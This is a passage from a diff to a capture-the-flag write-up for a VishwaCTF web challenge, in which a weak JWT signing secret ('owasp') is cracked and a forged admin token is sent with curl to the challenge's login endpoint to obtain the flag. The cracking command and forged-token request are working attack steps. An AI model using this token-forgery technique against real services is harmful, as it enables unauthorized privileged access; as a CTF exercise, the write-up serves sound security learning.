@@ -21,3 +21,16 @@ jwt-cracker abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 eyJhb
 
 
 this took a while but we found eventually the key used : ` "owasp" ` 
+
+Now we just need to craft a new cookie and send up and access the /api/login/user endpoint
+
+```
+curl -X POST https://k33p-y0ur-53cr3t5.vishwactf.com/api/login/user -H "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2NDc3ODgyNjJ9.uu3NUzQOkwzACFnCmHVnqljT7_Xv_ko2ND8x0pbQPqA"
+```
+
+and we get the flag !
+
+![image](https://user-images.githubusercontent.com/58823465/159310616-f5c9f748-0628-479f-9a6d-6aee642d74ec.png)
+
+
+``` Flag : vishwaCTF{w3@k_$ecr3t$} ```
